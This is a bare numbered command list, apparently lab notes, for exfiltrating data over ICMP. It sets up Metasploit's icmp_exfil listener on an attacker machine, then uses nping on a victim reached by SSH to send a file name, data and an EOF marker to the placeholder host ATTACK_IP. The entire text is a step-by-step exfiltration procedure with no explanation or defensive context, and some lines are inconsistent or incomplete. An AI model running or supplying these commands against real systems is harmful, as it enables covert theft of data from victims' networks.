### Commands:

#### 1) Attacker: msfconsole

#### 2) use auxiliary/server/icmp_exfil

#### 3) set BPF_FILTER icmp and not src ATTACKER_IP

#### 4) set INTERFACE OUR_INTERFACE

#### 5) run

#### 6) Jumpbox: ssh USER@VICTIM_DOMAIN

#### 7) Victim: sudo nping --icmp -c 1 ATTACK_IP --data-string

#### 8) Victim: sudo nping --icmp -c 1 ATTACK_IP "BOFFile.txt" --data-string "data"

#### 9) sudo nping --icmp -c 1 ATTACK_IP --data-string "EOF"

#### 10) Attacker: run
